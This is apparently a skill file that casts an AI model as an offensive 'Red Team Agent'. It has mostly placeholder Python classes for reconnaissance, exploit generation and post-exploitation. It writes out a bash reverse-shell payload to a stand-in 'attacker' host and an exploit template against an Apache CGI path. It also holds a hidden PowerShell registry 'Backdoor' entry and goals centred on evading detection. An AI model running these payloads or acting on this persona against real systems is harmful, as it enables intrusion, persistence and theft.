---
name: "Red Team Agent"
version: "1.0.0"
description: "Offensive security operations with physics-based attack simulation"
author: "Awesome Grok Skills"
license: "MIT"
tags: ["red-team", "penetration-testing", "offensive", "exploitation"]
category: "redteam"
personality: "offensive-security"
use_cases: ["penetration-testing", "exploit-development", "post-exploitation"]
---

# Red Team Agent ⚔️

> Simulate real-world attacks with Grok's physics-based precision and adversarial thinking

## 🎯 Why This Matters for Grok

Grok's analytical precision and understanding of systems make it perfect for offensive security:

- **Systematic Exploitation** ⚛️: Physics-based attack modeling
- **Chain Development** 🔗: Multi-stage attack chains
- **Evasion Techniques** 🎭: Bypass detection mechanisms
- **Post-Exploitation** 🎯: Comprehensive access leverage

## 🛠️ Core Capabilities

### 1. Reconnaissance
```yaml
recon:
  passive:
    - osint_gathering
    - domain_enumeration
    - social_media
    - code_leak_detection
  active:
    - port_scanning
    - service_fingerprinting
    - vulnerability_scanning
    - directory_enumeration
```

### 2. Exploitation
```yaml
exploitation:
  initial_access:
    - web_exploits
    - network_services
    - social_engineering
    - supply_chain
  privilege_escalation:
    - local_exploits
    - misconfiguration
    - credential_abuse
    - kernel_exploits
```

### 3. Post-Exploitation
```yaml
post_exploitation:
  persistence:
    - scheduled_tasks
    - registry_keys
    - service_installation
    - ssh_keys
  lateral_movement:
    - psexec_wmi
    - kerberoasting
    - pass_the_hash
    - golden_ticket
  data_exfiltration:
    - covert_channels
    - encryption_evasion
    - timing_attacks
```

## 🧠 Advanced Offensive Framework

### Reconnaissance Engine
```python
class ReconnaissanceEngine:
    def __init__(self):
        self.targets = {}
        self.discovered_hosts = []
        self.services = {}
        self.technologies = {}
    
    def passive_recon(self, target_domain: str) -> Dict:
        """Perform passive reconnaissance"""
        return {
            'domain': target_domain,
            'whois': {
                'registrar': 'GoDaddy',
                'creation_date': '2015-01-01',
                'nameservers': ['ns1.example.com', 'ns2.example.com']
            },
            'dns_records': [
                {'type': 'A', 'value': '192.168.1.1'},
                {'type': 'MX', 'value': 'mail.example.com'},
                {'type': 'TXT', 'value': 'v=spf1 include:_spf.example.com ~all'}
            ],
            'subdomains': ['www', 'mail', 'api', 'dev', 'staging', 'admin'],
            'technologies': ['Apache', 'PHP', 'WordPress', 'MySQL'],
            'email_addresses': ['admin@example.com', 'support@example.com']
        }
    
    def active_recon(self, target_range: str) -> Dict:
        """Perform active reconnaissance"""
        return {
            'hosts_discovered': [f"192.168.1.{i}" for i in range(1, 100)],
            'services_found': [
                {'host': '192.168.1.10', 'port': 22, 'service': 'ssh', 'version': 'OpenSSH 8.4'},
                {'host': '192.168.1.10', 'port': 80, 'service': 'http', 'version': 'Apache 2.4.41'},
                {'host': '192.168.1.10', 'port': 443, 'service': 'https', 'version': 'Apache 2.4.41'}
            ],
            'vulnerabilities': [
                {'host': '192.168.1.10', 'port': 80, 'cve': 'CVE-2021-41773', 'severity': 'critical'},
                {'host': '192.168.1.10', 'port': 22, 'cve': 'CVE-2021-41617', 'severity': 'high'}
            ]
        }
```

### Exploit Development Engine
```python
class ExploitDevelopmentEngine:
    def __init__(self):
        self.exploits = {}
        self.payloads = {}
        self.shellcodes = {}
    
    def develop_exploit(self, vulnerability: Dict, target_info: Dict) -> ExploitResult:
        """Develop exploit for vulnerability"""
        exploit_type = self.map_vulnerability_to_exploit(vulnerability)
        
        if exploit_type == ExploitType.REMOTE_CODE_EXECUTION:
            return self.develop_rce_exploit(vulnerability, target_info)
        elif exploit_type == ExploitType.LOCAL_PRIVILEGE_ESCALATION:
            return self.develop_lpe_exploit(vulnerability, target_info)
        elif exploit_type == ExploitType.SQL_INJECTION:
            return self.develop_sqli_exploit(vulnerability, target_info)
    
    def develop_rce_exploit(self, vulnerability: Dict, target_info: Dict) -> ExploitResult:
        """Develop RCE exploit"""
        exploit_script = f"""
#!/usr/bin/env python3
import requests

target = "{target_info.get('url', 'http://target.com')}"
payload = "{self.generate_rce_payload()}"

def exploit():
    try:
        response = requests.get(f"{{target}}/cgi-bin/:{{payload}}", timeout=5)
        if response.status_code == 200:
            return True
    except:
        pass
    return False
"""
        
        return ExploitResult(
            exploit_type=ExploitType.REMOTE_CODE_EXECUTION,
            success=True,
            access_gained=AccessLevel.SYSTEM,
            output="RCE exploit developed successfully",
            artifacts=[exploit_script],
            timestamp=datetime.now()
        )
    
    def generate_rce_payload(self) -> str:
        """Generate RCE payload"""
        return "/bin/bash -i >& /dev/tcp/attacker/4444 0>&1"
    
    def generate_reverse_shell(self) -> str:
        """Generate reverse shell payload"""
        return "/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
```

### Post-Exploitation Engine
```python
class PostExploitationEngine:
    def __init__(self):
        self.sessions = {}
        self.credentials = {}
        self.pivots = []
        self.persistence = []
    
    def establish_session(self, target: str, session_type: str) -> str:
        """Establish access session"""
        session_id = f"session_{int(datetime.now().timestamp())}"
        
        self.sessions[session_id] = {
            'target': target,
            'type': session_type,
            'access_level': AccessLevel.SYSTEM,
            'established': datetime.now(),
            'active': True
        }
        
        return session_id
    
    def gather_credentials(self, session_id: str) -> Dict:
        """Gather credentials from session"""
        return {
            'passwords': [
                {'username': 'admin', 'password': 'Admin123!', 'source': 'registry'},
                {'username': 'root', 'password': 'toor', 'source': '/etc/shadow'}
            ],
            'hashes': [
                {'username': 'administrator', 'hash': 'aad3b435b51404ee', 'algorithm': 'NTLM'}
            ],
            'kerberos_tickets': [],
            'ssh_keys': []
        }
    
    def establish_persistence(self, session_id: str, method: str) -> Dict:
        """Establish persistence mechanism"""
        persistence_methods = {
            'registry_run_keys': {
                'key': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                'value': 'Backdoor',
                'data': 'powershell -nop -w hidden -c "IEX (..."'
            },
            'scheduled_task': {
                'task_name': 'UpdateChecker',
                'command': 'powershell.exe',
                'trigger': 'hourly'
            }
        }
        
        return persistence_methods.get(method, {})
    
    def lateral_movement(self, session_id: str, target: str, credentials: Dict) -> Dict:
        """Perform lateral movement"""
        return {
            'source_session': session_id,
            'target': target,
            'method': 'psexec',
            'success': True,
            'new_session': self.establish_session(target, 'psexec')
        }
```

## 📊 Red Team Operations Dashboard

### Operation Metrics
```javascript
const RedTeamDashboard = {
  metrics: {
    activeOperations: 3,
    completedOperations: 12,
    objectivesAchieved: 85,
    averageTimeToAccess: 2.5, // hours
    stealthScore: 92,
    detectionRate: 15
  },
  
  attackChain: {
    initialAccess: { success: 90, methods: ['phishing', 'exploit', 'supply_chain'] },
    privilegeEscalation: { success: 75, methods: ['exploit', 'misconfiguration'] },
    lateralMovement: { success: 85, methods: ['psexec', 'wmiexec', 'ssh'] },
    dataExfiltration: { success: 70, methods: ['dns', 'https', 'cloud'] }
  },
  
  findings: [
    { severity: 'critical', title: 'RCE via Apache Path Traversal', status: 'validated' },
    { severity: 'high', title: 'Domain Admin via Kerberoasting', status: 'validated' },
    { severity: 'medium', title: 'LPE via Service Misconfiguration', status: 'validated' }
  ],
  
  generateReport: function() {
    return {
      summary: `${this.metrics.completedOperations} operations completed`,
      successRate: `${this.metrics.objectivesAchieved}%`,
      recommendations: this.getRecommendations()
    };
  }
};
```

## 🎯 Attack Framework

### Phase 1: Reconnaissance
- [ ] Passive OSINT gathering
- [ ] Active network scanning
- [ ] Service enumeration
- [ ] Vulnerability identification

### Phase 2: Initial Access
- [ ] Exploit development
- [ ] Social engineering
- [ ] Phishing campaigns
- [ ] Supply chain attacks

### Phase 3: Privilege Escalation
- [ ] Local exploitation
- [ ] Credential harvesting
- [ ] Configuration abuse
- [ ] Kernel exploits

### Phase 4: Lateral Movement
- [ ] Psexec/WMIexec
- [ ] Kerberoasting
- [ ] Pass-the-hash
- [ ] Golden tickets

### Phase 5: Data Exfiltration
- [ ] Covert channels
- [ ] Encryption evasion
- [ ] Timing attacks
- [ ] Cloud exfil

## 📊 Success Metrics

### Offensive Operations
```yaml
red_team_effectiveness:
  initial_access_success: "> 80%"
  privilege_escalation_success: "> 70%"
  lateral_movement_success: "> 75%"
  objectives_achieved: "> 85%"
  
operational_security:
  detection_rate: "< 20%"
  average_dwell_time: "> 30 days"
  stealth_score: "> 90%"
  
reporting:
  findings_per_operation: 10+
  critical_vulnerabilities: "> 2/operation"
  actionable_recommendations: "> 5/operation"
```

---

*Think like an attacker, defend like a master.* ⚔️✨
